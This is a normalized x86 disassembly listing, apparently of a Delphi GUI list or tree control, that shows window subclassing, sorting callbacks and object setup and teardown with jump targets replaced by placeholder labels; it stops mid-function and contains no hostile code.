add eax 0x15
add eax [ ebp - 0x10 ]
add [ ebp - 0x18 ] eax
dec [ ebp - 0x1c ]
jne r-xdata
inc esi
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_47db78
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x18 ]
add edx 0x14
call sub_404688
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
call sub_47d618
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x20 ]
call sub_47d7d0
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x8 ]
mov edx 0x1
mov eax [ ebp - 0x20 ]
call sub_47d7d0
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x4 ]
mov edx 0x2
mov eax [ ebp - 0x20 ]
call sub_47d7d0
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x20 ]
call sub_47d6c8
mov eax [ ebp - 0x18 ]
lea ebx [ eax + 0x14 ]
xor eax eax
mov al [ ebx ]
inc eax
add ebx eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov esi [ eax + 0xc ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_404688
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
mov al [ ebx ]
lea edx [ eax + 0x1 ]
add [ ebp - 0x10 ] edx
add ebx edx
dec esi
jne r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0x1c ]
jne r-xdata
inc esi
xor ebx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_47dc04
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
movsx ecx [ edi ]
mov edx ebx
mov eax [ ebp - 0x24 ]
call sub_47daa4
add edi 0x2
inc ebx
dec esi
jne r-xdata
sub_47e22c
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47e4c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10 ] 0x8
mov eax [ ebp - 0x4 ]
call sub_47dbd4
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x10 ]
call sub_40859c
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_47e49f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
call sub_47dbd4
mov edx [ ebp - 0x1c ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x1c ]
add eax 0x8
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
call sub_47dbd4
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0xc ] 0x0
mov edi [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_47dbd4
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x14 ]
add eax 0x15
add [ ebp - 0x10 ] eax
inc [ ebp - 0xc ]
dec [ ebp - 0x28 ]
jne r-xdata
inc ebx
xor esi esi
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_418b44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e4a6
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_402764
retn
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x20 ]
movzx eax [ eax + 0x14 ]
add eax 0x15
add eax [ ebp - 0x18 ]
add [ ebp - 0x20 ] eax
inc [ ebp - 0xc ]
dec [ ebp - 0x28 ]
jne r-xdata
inc ebx
xor esi esi
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_47dc04
mov eax [ eax + 0x24 ]
call sub_47e218
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_47dc04
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_47dc04
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x34 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x34 ]
call sub_47e218
inc eax
add [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x2
inc esi
dec ebx
jne r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x28 ]
jne r-xdata
inc ebx
xor esi esi
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_47dc04
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x20 ]
add eax 0x14
mov edx [ ebp - 0x2c ]
mov edx [ edx + 0x24 ]
mov ecx 0xff
call sub_4046c0
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x20 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x20 ]
add eax 0x14
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x20 ]
movzx eax [ eax + 0x14 ]
inc eax
add [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
lea ecx [ ebp - 0x38 ]
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x24 ]
mov ecx 0xff
call sub_4046c0
mov eax [ ebp - 0x24 ]
movzx eax [ eax ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
inc eax
add [ ebp - 0x18 ] eax
add [ ebp - 0x24 ] eax
inc esi
dec ebx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_47dc04
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x30 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx esi
mov eax [ ebp - 0x30 ]
call sub_47da98
mov [ edi ] ax
add edi 0x2
inc esi
dec ebx
jne r-xdata
sub_47e50c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403690
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_403a24
mov [ edi + 0x4 ] esi
xor edx edx
mov eax edi
call sub_47e580
xor edx edx
mov eax edi
call sub_47e594
mov dl 0x1
mov eax edi
call sub_47e5a8
mov eax edi
test bl bl
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_47e5bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_47d52c
cmp [ eax + 0x2ea ] 0x0
je r-xdata
mov eax [ esi + 0x24 ]
call sub_4048dc
push eax
mov eax [ ebx + 0x24 ]
call sub_4048dc
push eax
call lstrcmpA
mov [ ebp - 0x4 ] eax
push esi
mov eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_47d52c
mov esi eax
mov eax ebx
call sub_47d52c
mov edx eax
mov ecx ebx
mov eax [ esi + 0x2ec ]
call [ esi + 0x2e8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_47e628
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_444294
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0xfa
mov eax ebx
call sub_441520
mov edx 0x96
mov eax ebx
call sub_441544
mov dl 0x1
mov eax ebx
call sub_47f444
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x124 ]
xor edx edx
mov eax ebx
call sub_441f28
mov dl 0x1
mov eax ebx
call sub_4486b8
mov dl 0x1
mov eax ebx
call sub_47f824
mov dl 0x1
mov eax ebx
call sub_47f4c8
mov dl 0x1
mov eax ebx
call sub_47f458
mov dl 0x1
mov eax [ r-xdata ]
call sub_421e30
mov esi eax
mov [ ebx + 0x210 ] esi
mov eax esi
mov edx ebx
call sub_440940
mov [ ebx + 0x26c ] 0xffffffff
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47ce74
mov [ ebx + 0x23c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov [ ebx + 0x22c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf4 ]
mov [ ebx + 0x28c ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47e50c
mov [ ebx + 0x234 ] eax
mov eax [ r-xdata ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41752c
mov [ ebx + 0x290 ] eax
mov [ ebx + 0x294 ] 0x0
mov [ ebx + 0x295 ] 0x0
xor eax eax
mov [ ebx + 0x2a0 ] eax
push 0x20
mov ecx 0x20
mov dl 0x1
mov eax [ r-xdata ]
call sub_44ebf4
mov [ ebx + 0x224 ] eax
push ebx
push sub_47f098
call sub_41f228
mov [ ebx + 0x250 ] eax
push ebx
push sub_47efa0
call sub_41f228
mov [ ebx + 0x25c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov esi eax
mov [ ebx + 0x27c ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_47ed7c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov esi eax
mov [ ebx + 0x280 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_47ed7c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov esi eax
mov [ ebx + 0x284 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_47ed7c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_47e810
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax esi
call sub_448788
test al al
je r-xdata
mov eax [ esi + 0x224 ]
call sub_4036c0
mov eax [ esi + 0x23c ]
call sub_4036c0
mov eax [ esi + 0x28c ]
call sub_4036c0
mov eax [ esi + 0x22c ]
call sub_4036c0
mov eax [ esi + 0x234 ]
call sub_4036c0
mov eax [ esi + 0x240 ]
call sub_4036c0
mov eax [ esi + 0x248 ]
call sub_4036c0
mov eax [ esi + 0x24c ]
call sub_4036c0
mov eax [ esi + 0x290 ]
call sub_4036c0
mov eax [ esi + 0x250 ]
call sub_41f2c0
mov eax [ esi + 0x264 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ esi + 0x25c ]
call sub_41f2c0
mov eax [ esi + 0x27c ]
call sub_4036c0
mov eax [ esi + 0x280 ]
call sub_4036c0
mov eax [ esi + 0x284 ]
call sub_4036c0
mov eax [ esi + 0x210 ]
call sub_4036c0
xor eax eax
mov [ esi + 0x210 ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4443b8
test bl bl
jle r-xdata
mov edx [ esi + 0x260 ]
push edx
push 0xfffffffc
push eax
call SetWindowLongA
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_47e910
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
call sub_473ae8
mov edx esi
mov eax ebx
call sub_4453e0
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44530c
mov edx [ esi + 0x4 ]
or edx 0x2000000
xor ecx ecx
mov cl [ ebx + 0x215 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x214 ]
or edx [ ecx * 4 + rw-data ]
mov eax [ ebx + 0x234 ]
xor ecx ecx
mov cl [ eax + 0x8 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x216 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x228 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x238 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ eax + 0x9 ]
or edx [ ecx * 4 + rw-data ]
movzx eax [ eax + 0xa ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x22b ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x22a ]
or edx [ eax * 4 + rw-data ]
or edx 0x40
mov [ esi + 0x4 ] edx
cmp [ ebx + 0x244 ] 0x0
je r-xdata
cmp [ ebx + 0x245 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x1000
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x400
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x214 ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_47ea3c
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_417110
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x248 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419298
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47eac4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41b6a8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x23c ]
mov eax [ ebp - 0x4 ]
call sub_419f54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
sub_47eaf0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44550c
mov eax [ ebp - 0x4 ]
call sub_47f1b8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0x4 ]
call sub_47f4fc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_47f4dc
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x268 ]
mov eax [ ebp - 0x4 ]
call sub_47f530
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_47cf08
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x218 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_47dce8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x289 ] 0x1
xor eax eax
push ebp
push sub_47ec1a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_417110
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov edx [ ebp - 0x4 ]
call sub_418c70
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x240 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x21c ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_44ed6c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x274 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2a0 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_47dcac
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x220 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_44ed6c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
call sub_44ef40
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_47ed54
push ebp
call sub_47ea3c
pop ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_441e58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_47dec4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x289 ] 0x0
retn
mov eax [ ebp - 0x4 ]
call sub_47f2b4
mov eax [ ebp - 0x4 ]
call sub_4816d8
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
call sub_44ed6c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_44ef40
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x4 ]
call sub_47ed54
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_44ef40
mov edx eax
mov ecx 0x2
mov eax [ ebp - 0x4 ]
call sub_47ed54
sub_47ecd8
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call sub_418964
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx + 0x240 ] eax
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x240 ]
call sub_418cd0
push 0x0
push 0x0
mov eax [ ebx + 0x240 ]
call sub_418900
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov eax [ ebx + 0x22c ]
call sub_47dbd4
mov [ ebx + 0x2a0 ] eax
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov eax ebx
call sub_4458bc
pop ebx
retn
mov eax ebx
call sub_47f340
sub_47ed54
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_448484
mov ecx edi
mov edx esi
call sub_42902c
sub_47ed7c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi esi
mov eax edi
call sub_44ed6c
test al al
je r-xdata
xor eax eax
mov eax edi
call sub_44ef40
jmp r-xdata
cmp esi [ ebx + 0x21c ]
jne r-xdata
xor ecx ecx
mov edx eax
mov eax ebx
call sub_47ed54
jmp r-xdata
cmp esi [ ebx + 0x218 ]
jne r-xdata
cmp esi [ ebx + 0x220 ]
jne r-xdata
mov ecx 0x1
mov edx eax
mov eax ebx
call sub_47ed54
jmp r-xdata
mov ecx 0x2
mov edx eax
mov eax ebx
call sub_47ed54
sub_47edf0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_441234
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x218 ]
jne r-xdata
cmp esi [ edi + 0x21c ]
jne r-xdata
xor edx edx
mov eax edi
call sub_480fdc
cmp esi [ edi + 0x220 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_48104c
xor edx edx
mov eax edi
call sub_4810c4
sub_47ee64
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push j_sub_403e54#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_4171e4
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405994
add esp 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_4171e4
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_448484
mov ecx [ ebp - 0x4 ]
pop edx
call sub_4293e8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_47ef71
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_4171e4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
inc esi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ef78
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x295 ] 0x0
retn
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_481ff8
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
inc ebx
dec esi
jne r-xdata
sub_47efa0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403ba0#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx ]
mov eax esi
sub eax 0x82
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x264 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x264 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x260 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
sub eax 0x191
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x264 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x295 ] 0x0
je r-xdata
push ebp
call sub_47ee64
pop ecx
jmp r-xdata
sub_47f098
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403ba0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x105
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44740c
test al al
je r-xdata
sub eax 0x100
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub eax 0x2
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44733c
test al al
je r-xdata
dec eax
je r-xdata
sub eax 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4474d4
test al al
je r-xdata
sub eax 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp r-xdata
sub_47f198
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_448484
mov ecx edi
mov edx esi
call sub_429150
pop edi
pop esi
pop ebx
retn
sub_47f1b8
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edi edi
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
mov esi 0x402
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov edi eax
xor edx edx
mov eax ebx
call sub_4810c4
cmp [ ebx + 0x277 ] 0x0
je r-xdata
mov esi 0x4
cmp [ ebx + 0x278 ] 0x0
je r-xdata
or esi 0x1
cmp [ ebx + 0x27a ] 0x0
je r-xdata
or esi 0x8
cmp [ ebx + 0x275 ] 0x0
je r-xdata
or esi 0x20
cmp [ ebx + 0x276 ] 0x0
je r-xdata
or esi 0x100
cmp [ ebx + 0x294 ] 0x0
je r-xdata
or esi 0x10
test [ ebx + 0x279 ] 0x1
je r-xdata
or esi 0x2000
mov al [ r-xdata ]
and al [ ebx + 0x279 ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
or esi 0x40
jmp r-xdata
test [ ebx + 0x279 ] 0x4
je r-xdata
or esi 0x80
test [ ebx + 0x279 ] 0x2
je r-xdata
or esi 0x800
mov eax ebx
call sub_448484
mov edx esi
call sub_4293b4
test edi edi
je r-xdata
or esi 0x1000
mov edx edi
mov eax ebx
call sub_4810c4
sub_47f2b4
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov eax [ ebx + 0x22c ]
call sub_47dbd4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x24c ]
call sub_4036c0
xor eax eax
mov [ ebx + 0x24c ] eax
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_47dc04
mov al [ eax + 0x2a ]
push eax
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_47dc04
pop edx
call sub_47d5b0
mov edx esp
mov ecx 0x1
mov ebp [ eax ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_47dc04
mov dl [ esp ]
call sub_47d5b0
jmp r-xdata
mov eax [ ebx + 0x24c ]
test eax eax
je r-xdata
inc esi
dec edi
jne r-xdata
sub_47f340
push ebx
push esi
push edi
push ebp
push ecx
